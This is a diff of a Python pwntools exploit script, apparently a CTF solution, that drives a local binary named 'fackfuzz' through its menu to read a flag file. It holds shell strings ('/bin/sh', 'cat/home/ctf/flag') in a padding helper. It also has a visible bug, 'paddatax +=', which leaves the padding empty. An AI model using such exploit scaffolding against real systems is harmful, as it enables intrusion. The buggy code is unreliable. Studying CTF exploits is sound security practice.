@@ -125,50 +125,51 @@ port=8888
 objname = "fackfuzz"
 objpath = "./"+objname
 io = process(objpath)
-	
+elf = ELF(objpath)
+
 def readuntil(delim):
-   	data = io.recvuntil(delim);
-   	print data;
-   	return data;
-	
+    data = io.recvuntil(delim);
+    print data;
+    return data;
+
 def readlen(len):
-   	data = io.recv(len,1);
-   	return data;
-	
+    data = io.recv(len,1);
+    return data;
+
 def readall():
-   	data = io.recv(4096,1);
-   	print data;
-   	return data;
-	
+    data = io.recv(4096,1);
+    print data;
+    return data;
+
 def write(data):
-   	sleep(0.05)
-   	io.send(str(data));
-	    
+    sleep(0.05)
+    io.send(str(data));
+    
 def writeline(data):
-   	sleep(0.05)
-   	io.sendline(str(data));
-	
+    sleep(0.05)
+    io.sendline(str(data));
+
 def padding(size):
-   	cf = "/bin/shcat/home/ctf/flag";
-   	paddata = "";
-   	for i in range(size):
+    cf = "/bin/shcat/home/ctf/flag";
+    paddata = "";
+    for i in range(size):
         paddatax += cf[i%len(cf)];
-   	return paddata;
-	
+    return paddata;
+
 def newdriver(name):
-	writeline(1);
-	writeline(name)
-	readall()
+    writeline(1);
+    writeline(name)
+    readall()
 def prepare(readsize,readdata):
-	writeline(2);
-	writeline(readsize);
-	writeline(readdata);
-	writeline(2);
-	writeline(1);
-	writeline(1);
-	writeline(1);
-	writeline(1);
-   	readall()
+    writeline(2);
+    writeline(readsize);
+    writeline(readdata);
+    writeline(2);
+    writeline(1);
+    writeline(1);
+    writeline(1);
+    writeline(1);
+    readall()
 def startfuzz(name):
     writeline(3);
     writeline(name);
@@ -181,7 +182,7 @@ def viewdriver():
     writeline(5);
     print readuntil(":");
     return readuntil("\n")[:-1];
-    	
+
 def attack(ip=0):
     global io
     if ip != 0:
@@ -207,7 +208,7 @@ def attack(ip=0):
     
     startfuzz("/dev/haha4");
     sleep(3)
-    readall()＃get flag
+    readall()#get flag
 
 attack()
 ```
